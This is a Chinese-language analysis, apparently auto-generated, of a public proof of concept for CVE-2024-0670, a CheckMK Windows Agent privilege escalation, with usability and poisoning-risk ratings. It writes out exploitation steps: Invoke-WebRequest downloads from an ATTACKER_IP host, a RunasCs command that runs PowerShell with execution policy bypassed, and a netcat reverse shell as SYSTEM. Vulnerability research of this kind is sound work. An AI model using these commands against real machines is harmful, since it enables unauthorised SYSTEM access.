## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高危

**CVSS评分:** 

**影响版本:** 未明确指定，适用于安装了CheckMK Windows Agent的受影响版本

**利用条件:** 需要低权限Windows用户凭证；目标系统需安装CheckMK Windows Agent并启用PowerShell；攻击者需要网络连接以托管文件和接收反向shell。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

该POC (Proof of Concept) 针对CVE-2024-0670，一个影响CheckMK Windows Agent的本地权限提升漏洞。该漏洞的核心在于CheckMK Agent在执行MSI修复操作时，会在`C:\Windows\Temp\`目录下执行文件。由于该目录通常对低权限用户可写，攻击者可以预先在此处放置恶意文件，并在MSI修复机制被触发时，以`NT AUTHORITY\SYSTEM`的权限执行这些文件。

**POC有效性分析:**
该POC提供了一个清晰且完整的利用链。它包含以下关键组件：
1.  `RunasCs.exe`: 一个自定义的`runas`替代工具，支持明文密码，便于自动化执行。它使得低权限用户能够以特定用户（如当前用户）身份启动进程，并进一步通过PowerShell脚本触发漏洞。
2.  `nc.exe`: 标准的Netcat工具，用于建立反向shell，作为权限提升成功后的攻击载荷。
3.  `exploit.ps1`: 核心PowerShell利用脚本（未直接提供代码，但根据描述是用于触发漏洞的脚本）。该脚本的作用是向`C:\Windows\Temp\`目录播种（seed）多个预设名称的恶意载荷文件，然后触发CheckMK Agent的MSI修复机制。
整个利用过程设计合理，符合该类权限提升漏洞的典型模式。通过控制`C:\Windows\Temp\`目录下的文件并诱导高权限进程执行，攻击者能够将执行上下文从低权限用户提升至系统级权限。POC的README文档详细阐述了先决条件、文件结构和利用步骤，使其易于理解和复现。基于其清晰的描述和完整的文件清单（核心exploit.ps1虽未展示但其功能描述完整），该POC被评估为高度有效。攻击者只需满足低权限用户访问和网络连通性，即可通过该POC在目标系统上实现SYSTEM权限。

**利用步骤:**
1.  **准备攻击环境**: 攻击者需要在其机器上启动一个简单的HTTP服务器（例如使用Python的`http.server`模块），用于托管`RunasCs.exe`、`nc.exe`和`exploit.ps1`文件。同时，攻击者还需要启动一个Netcat监听器（例如`nc -lvnp 1111`），等待来自受害系统的反向shell连接。
2.  **文件下载**: 在受害的Windows机器上，作为低权限用户，通过`Invoke-WebRequest`命令从攻击者的HTTP服务器下载`RunasCs.exe`、`nc.exe`和`exploit.ps1`文件，并将它们保存到`C:\Windows\Temp\`目录。
    *   `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"`
    *   `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"`
    *   `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"`
3.  **执行利用脚本**: 在受害机器上，以低权限用户的身份，使用`RunasCs.exe`工具执行下载到`C:\Windows\Temp\`目录下的`exploit.ps1`脚本。
    *   `.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"`
    `exploit.ps1`脚本会负责向`C:\Windows\Temp\`目录播种伪造的载荷文件，并触发CheckMK Agent的MSI修复机制。当MSI修复过程启动时，由于`C:\Windows\Temp\`目录的可写性，它将执行攻击者放置的恶意载荷，从而以`NT AUTHORITY\SYSTEM`的权限运行预设的`nc.exe`，连接回攻击者的Netcat监听器，最终获得一个SYSTEM权限的反向shell。

**投毒风险分析:**
该POC的投毒风险被评估为**低（10%）**。主要原因如下：
1.  **代码清晰度与目的明确**: POC的README文档明确说明了其目的（CheckMK Agent本地权限提升）和工作原理。所包含的`RunasCs.cs`源代码（部分展示）也显示其为一个自定义的`runas`工具，旨在帮助执行命令，而不是隐藏恶意行为。它没有表现出混淆、复杂加密或其他试图隐藏真实意图的迹象。
2.  **文件来源与作用**: POC明确指出需要下载`nc.exe`和`RunasCs.exe`。`nc.exe`是标准工具，其用于建立反向shell是漏洞利用的常见载荷，并非POC本身的“投毒”。`RunasCs.exe`的C#源代码可见，虽然没有提供完整代码，但现有片段显示它专注于进程创建和凭证管理，没有明显的恶意功能。
3.  **PowerShell脚本**: `exploit.ps1`脚本虽然未直接提供代码，但其描述是“播种多个payload文件名并触发MSI修复”，这与漏洞利用机制完全吻合，属于漏洞利用逻辑的一部分，而非额外的恶意功能。
4.  **外部依赖**: POC确实要求从攻击者控制的HTTP服务器下载文件。从防御性研究的角度看，任何从不受信任来源下载并执行文件的操作都伴随固有风险。攻击者可以在其HTTP服务器上替换这些文件，用真正的恶意软件取代本应是利用工具的文件。然而，这是利用*方式*的风险，而非*POC代码本身*被投毒的风险。对于本特定POC，它假定用户会从其（或作者指定）的仓库获取文件，并在自己的控制下托管HTTP服务器。因此，我们评估的是POC代码本身是否存在恶意隐藏功能，而非攻击者利用该POC时可能采取的额外恶意操作。
5.  **无混淆或可疑行为**: 根据提供的信息，POC的代码和描述均未发现混淆、动态代码加载（如`eval`）、或对标准库的异常调用等典型投毒迹象。所有组件的目的都与实现本地权限提升这一漏洞利用目标一致。综上所述，虽然在实际操作中从未知来源下载并执行任何文件都需高度警惕，但就该POC代码和文档本身而言，没有发现恶意投毒的证据。它专注于实现其声明的漏洞利用目标，不包含额外的、隐蔽的恶意载荷。

**项目地址:** https://github.com/skylight-cyber/CVE-2024-0670

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
